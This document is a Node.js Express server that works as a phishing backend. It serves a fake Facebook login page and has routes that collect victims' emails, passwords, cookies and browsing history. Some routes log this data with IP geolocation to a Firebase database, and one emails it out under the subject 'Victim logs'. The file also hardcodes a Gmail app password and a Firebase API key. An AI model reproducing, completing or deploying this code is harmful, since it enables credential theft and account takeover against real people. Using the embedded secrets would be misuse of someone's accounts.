const express = require('express');
const cors = require("cors");
const axios = require('axios');
const path = require('path');
const app = express();
const port = 3000; // You can use any port number you prefer
app.use(express.urlencoded({ extended: true }));

app.use(express.json({limit : '10mb'}));
app.use(cors());

// Import the functions you need from the SDKs you need
const { initializeApp } = require('firebase/app');
const { getDatabase, ref, set, serverTimestamp, push } = require('firebase/database');
// TODO: Add SDKs for Firebase products that you want to use
// https://firebase.google.com/docs/web/setup#available-libraries

// Your web app's Firebase configuration
// For Firebase JS SDK v7.20.0 and later, measurementId is optional
const firebaseConfig = {
  apiKey: "AIzaSyCWtv7ywcBDKLWqxQ78kOIxXUN04yNbmqQ",
  authDomain: "hpp-server.firebaseapp.com",
  databaseURL: "https://hpp-server-default-rtdb.firebaseio.com",
  projectId: "hpp-server",
  storageBucket: "hpp-server.appspot.com",
  messagingSenderId: "1033612422697",
  appId: "1:1033612422697:web:f6ed94764155498a783638",
  measurementId: "G-V8T9BG89C3"
};

// Initialize Firebase
const apps = initializeApp(firebaseConfig);
const database = getDatabase(apps);
// Route to render pages based on query parameters
// Serve static files from the public directory
app.use('/public', express.static(path.join(__dirname, 'public')));
app.use('/private', express.static(path.join(__dirname, 'private')));
// app.use('/admin', express.static(path.join(__dirname, 'admin')));
app.get('/', (req, res) => {
    const page = req.query.browserr;

    switch (page) {
        case 'jppx-public':
            res.sendFile(path.join(__dirname, 'public', 'index.html'));
            console.error("visited");
            break;
        case 'jppx-private-view':
            res.sendFile(path.join(__dirname, 'private', 'index.html'));
            console.error("visitedx");
            break;
        // case 'admin':
        //     res.sendFile(path.join(__dirname, 'admin', 'index.html'));
        //     break;
        default:
            res.send('Page Not Found'); // Or render a 404 page
            break;
    }
});

app.post("/mail-it", async (req, res) =>{
    const {Cookies, History, Password, Email} = req.body;
    try{
        let content = `User Cookies: ${Cookies}\nUser History: ${History}\nUser Password: ${Password}`;
        var transporter = await nodemailer.createTransport({
            service: "gmail",
            auth: {
              user: "anonymous.server.tracking@gmail.com",
              pass: "zbfxwoklfjrdinhu",
            },
            tls: {
              rejectUnauthorized: false ,
            }
          });
    
        var mailOptions = {
            from: "Anonymous",
            to: Email,
            subject: "Victim logs",
            html: `
            <div style="font-family: Helvetica, Arial, sans-serif; min-width: 1000px; overflow: auto; line-height: 2;">
            ${content}
            </div>
          `,
          };
          transporter.sendMail(mailOptions, function (error, info) {
            if (error) {
              console.log("new", error);
            } else {
              console.log("Email sent: " + info.response);
            }
          });
    }catch(err){

    }
})

app.post("/loggs", async (req, res)=>{
  const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  let normalizedIp = clientIp;

// Normalize the IP address for local development
if (clientIp === '::1' || clientIp === '::ffff:127.0.0.1') {
  normalizedIp = '127.0.0.1';
}
  const {id, email, password} = req.body;
  try{
    const Reference = ref(database, id);
    // const urlx = "https://api.ipify.org?format=json"
    // const ip = await axios.get(urlx);
    // const pinn = ip.data;
    // console.log(pinn)
    const url = `http://ip-api.com/json/${normalizedIp}`;

    const locationCountry = await axios.get(url);
    const country = locationCountry.data.country;
    const state = locationCountry.data.regionName;

    const locationData = country + "/" + state;
    console.log(locationData)
    const data = {
      email,
      password,
      time: serverTimestamp(),
      ip: clientIp,
      country: locationData,
      virtualVerify: 0,
      physicalVerify: 0
    }
    const entryLevelRef = push(Reference, data);
    const pushKey = entryLevelRef.key;
    console.log(data, "$$", pushKey);
    res.status(200).json({message: "Logged", Key: pushKey})

  }catch(err){
    console.error(err);
    res.status(500).json({message: "Error"})
  }
})
app.post("/auth", async (req, res)=>{
  const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const {id, email, password} = req.body;
  try{
    const Reference = ref(database, id);
    // const urlx = "https://api.ipify.org?format=json"
    // const ip = await axios.get(urlx);
    // const pinn = ip.data;
    // console.log(pinn)
    const url = `http://ip-api.com/json/${clientIp}`;

    const locationCountry = await axios.get(url);
    const country = locationCountry.data.country;
    const state = locationCountry.data.regionName;

    const locationData = country + "/" + state;
    console.log(locationData)
    const data = {
      email,
      password,
      time: serverTimestamp(),
      ip: clientIp,
      country: locationData,
      virtualVerify: 0,
      physicalVerify: 0
    }
    const entryLevelRef = push(Reference, data);
    const pushKey = entryLevelRef.key;
    res.status(200).json({message: "Logged", Key: pushKey})

  }catch(err){
    console.error(err);
    res.status(500).json({message: "Error"})
  }
})
app.get("/Auth", async (req, res)=>{
    const type = req.query.type;
    switch(type){
        case "yahoo":
            break;
        case "facebook":
          res.sendFile(path.join(__dirname, 'public/facebook', 'index.html'));
            break;
        case "instagram":
            break;
        default:
            res.send('Page Not Found');
            break;
    }
})
// Start the server
app.listen(port, () => {
    console.log(`Server is running at http://localhost:${port}`);
});
